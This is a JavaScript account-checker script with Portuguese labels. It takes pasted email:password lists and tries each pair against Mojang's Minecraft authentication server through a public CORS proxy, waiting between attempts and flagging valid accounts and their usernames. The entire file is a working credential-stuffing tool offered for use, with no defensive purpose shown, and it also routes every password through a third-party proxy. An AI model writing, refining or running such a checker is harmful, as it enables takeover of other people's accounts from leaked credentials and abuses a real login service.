document.addEventListener('DOMContentLoaded', () => {
    const verificarBtn = document.getElementById('verificar-btn');
    const pararBtn = document.getElementById('parar-btn');
    const contasInput = document.getElementById('contas-input');
    const resultadoList = document.getElementById('resultado-list');
    const statusDiv = document.getElementById('status');
    
    const PROXY_URL = 'https://api.allorigins.win/raw?url=';
    const MOJANG_AUTH_URL = 'https://authserver.mojang.com/authenticate';
    const CHECK_DELAY = 1000; // Delay de 1 segundo entre as checagens

    let isChecking = false;

    async function fetchViaProxy(url, options) {
        const proxyRequestUrl = `${PROXY_URL}${encodeURIComponent(url)}`;
        try {
            const response = await fetch(proxyRequestUrl, options);
            if (response.status === 429) { // Too Many Requests - o proxy pode estar sobrecarregado
                throw new Error("Proxy sobrecarregado. Tente novamente mais tarde.");
            }
            return response;
        } catch (error) {
            throw new Error(`Erro de rede ou no proxy: ${error.message}`);
        }
    }

    async function autenticarConta(email, senha) {
        const payload = {
            agent: { name: "Minecraft", version: 1 },
            username: email,
            password: senha,
            requestUser: true
        };

        try {
            const response = await fetchViaProxy(MOJANG_AUTH_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            const text = await response.text();
            let data;
            
            try {
                data = JSON.parse(text);
            } catch {
                return { sucesso: false, mensagem: `❌ Falha: A API da Mojang respondeu com um formato inesperado.` };
            }

            if (data.selectedProfile) {
                const username = data.selectedProfile.name;
                return { sucesso: true, mensagem: `✅ Conta VÁLIDA: ${username}` };
            } else if (data.error === "ForbiddenOperationException") {
                return { sucesso: false, mensagem: `❌ Falha: Credenciais inválidas (e-mail ou senha incorretos).` };
            } else {
                return { sucesso: false, mensagem: `❌ Falha: ${data.errorMessage || 'Erro desconhecido'}` };
            }
        } catch (error) {
            return { sucesso: false, mensagem: `❌ Erro de conexão: ${error.message}` };
        }
    }
    
    function addResult(message, type) {
        const li = document.createElement('li');
        li.textContent = message;
        li.className = type;
        resultadoList.appendChild(li);
        // Rola para o final da lista
        resultadoList.scrollTop = resultadoList.scrollHeight;
    }

    async function verificarContas() {
        if (isChecking) return;

        const contasText = contasInput.value.trim();
        if (!contasText) {
            alert('Por favor, insira pelo menos uma conta.');
            return;
        }

        const contas = contasText.split('\n')
            .map(line => line.trim())
            .filter(line => line.includes(':'))
            .map(line => line.split(':', 2));

        if (contas.length === 0) {
            alert('Nenhuma conta no formato email:senha foi encontrada.');
            return;
        }

        isChecking = true;
        verificarBtn.disabled = true;
        pararBtn.disabled = false;
        resultadoList.innerHTML = '';
        
        for (let i = 0; i < contas.length; i++) {
            if (!isChecking) {
                statusDiv.textContent = 'Verificação cancelada pelo usuário.';
                break;
            }

            const [email, senha] = contas[i];
            statusDiv.textContent = `Verificando ${i + 1} de ${contas.length}: ${email}...`;
            
            const resultado = await autenticarConta(email, senha);
            
            if (isChecking) { // Checa novamente caso o usuário tenha cancelado durante a requisição
                addResult(`${email} -> ${resultado.mensagem}`, resultado.sucesso ? 'sucesso' : 'erro');
                await new Promise(resolve => setTimeout(resolve, CHECK_DELAY));
            }
        }
        
        if (isChecking) {
             statusDiv.textContent = 'Verificação concluída!';
        }
        
        isChecking = false;
        verificarBtn.disabled = false;
        pararBtn.disabled = true;
    }

    function pararVerificacao() {
        if (isChecking) {
            isChecking = false;
        }
    }

    verificarBtn.addEventListener('click', verificarContas);
    pararBtn.addEventListener('click', pararVerificacao);
});
